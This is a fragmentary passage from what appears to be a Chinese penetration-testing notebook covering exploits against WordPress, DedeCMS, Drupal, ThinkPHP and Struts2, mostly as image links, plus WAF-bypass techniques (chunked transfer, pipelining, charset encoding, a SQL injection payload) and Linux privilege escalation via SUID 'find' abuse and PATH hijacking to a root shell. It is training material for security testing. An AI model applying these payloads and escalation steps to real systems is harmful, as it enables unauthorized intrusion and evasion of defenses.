...
![wordpress5.0rec1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec1.png)


![wordpress5.0rec2](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec2.png)

![wordpress5.0rec3](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec3.png)

![wordpress5.0rec4](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec4.png)

![wordpress5.0rec5](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec5.png)

![wordpress5.0rec6](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec6.png)

![wordpress5.0rec7](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec7.png)

![wordpress5.0rec8](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec8.png)

![wordpress5.0rec9](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress5.0rec9.png)
...
![wordpress4.6rec2](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/wordpress4.6rec2.png)
...
![dedecms5.7passwordresset1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/dedecms5.7passwordresset1.png)

重置连接：ip/resetpassword.php?dopost getpasswd&id =1&3JdOa0iv（key 需要通过构造 POST 获取）

![dedecms5.7passwordresset2](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/dedecms5.7passwordresset2.png)

### 03-DedeCMS V57 版本漏洞-任意修改后台密码

由 admin 用户无法登录，因此无法直接修改密码，任意注册用户，BurpSuit抓包

![dedecms5.7passwordresset3](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/dedecms5.7passwordresset3.png)
...
![dedecms5.7upload1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/dedecms5.7upload1.png)
...
![cve-2014-3704](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/cve-2014-3704.png)
...
![cve-2018-7600](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/cve-2018-7600.png)
...
![thinkphp2rec](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/thinkphp2rec.png)
...
![thinkphp5rec](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/thinkphp5rec.png)
...
![s2-003](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/s2-003.png)
...
![s2-005](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/s2-005.png)
...
![s2-045&6](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/s2-045&6.png)
...
![s2-057](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/s2-057.png)
...
1. 【Content-Length更新】一定要去掉勾选
   ...
   ![pipline1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/pipline1.png)
...
4. 使用双请求包进⾏请求，响应也是两次，大多数的WAF仅检测第一个的请求，利用二次请求绕过WAF的检测。

   ![pipline4](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/pipline2.png)
...
1. 原始数据是【id=1‘UniOn sELeCt 1,user()%23】进行测试 ，可以得知已经被安全狗拦截。
   ...
   ![Block_transmission1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/Block_transmission1.png)
...
3. 一般的WAF都会有检测，可以通过分块传输进行绕过，经过分块转换之后，可将数据分为多个块。回显可以得知已经成功绕过安全狗获取到user账号
   ...
   ![Block_transmission2](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/Block_transmission2.png)
...
5. 对内容进行编码，使用方法为在Content-Type类型后加入【charset=ibm500】即可。
   ...
   ![HTTP_protocol_coverage1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/HTTP_protocol_coverage1.png)

6. 组合绕过，配合分块传输的方式进行绕过

   ![HTTP_protocol_coverage2](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/HTTP_protocol_coverage2.png)
...
![passwaf1](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/passwaf1.png)

### 02-绕过云锁

云锁是基于云检测的，在服务器端安装一个模块即可进行安全防护，可谓方便快捷。本小节简单介绍一下如何规避云锁的检测方法，我们可以先使用绕过安全狗WAF的方式进行测试。
...
![passwaf2](https://raw.githubusercontent.com/king-notfound404/Penetration-Zbook/main/img/passwaf2.png)
...
```bash
root@kali:~/桌面# searchsploit linux kernel 4.4.0 ubuntu 16.04
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
...
定位到EXP 后下一步要做的是想办法将 EXP 上传到目标系统，将EXP 远程拷贝到目标系统的【 tmp 】目录下，之所以要拷贝到【 tmp 】目录，是因为通常所有用户对此目录都具有读写权限
...
```bash
mark@any:/tmp$ find / -user root -perm -4000 -exec ls -ldb{} \;
mark@any:/tmp$ touch 1
mark@any:/tmp$ find 1 -exec whoami \;
root
```

使用【find 】命令查找设置SUID的文件，使用【find 】命令运行【 whoami 】查看当前用户，发现当前用户变成了 root 。

## 03-计划任务提权

【crontab 】是 Linux 的计划任务，它的服务是【 crond 】，配置文件为【 etc /crontab 】，可以通过编辑此配置文件配置定期执行程序或命令，也可以使用【 crontab 】命令配置。
...
有个【 test 】文件设置了 SUID ，并且具有执行权限。执行发现调用了【 cat 】命令，在【 tmp 】目录下生成一个内容为【 /bin/bash 】的【 cat 】文件，将文件权限设置为 777，然后将当前路径也就是【. 】这个符号添加到环境变量中，然后再运行【 test 】看是否能劫持【 cat 】命令 。

```bash
mark@any:/tmp$ ./test
cat: /tmp/1: No such file or directory
mark@any:/tmp$ echo "/bin/bash" >cat
mark@any:/tmp$ chmod 777 cat
mark@any:/tmp$ export PATH=.:$PATH
mark@any:/tmp$ ./test
root@any:/tmp# whoami
root
```
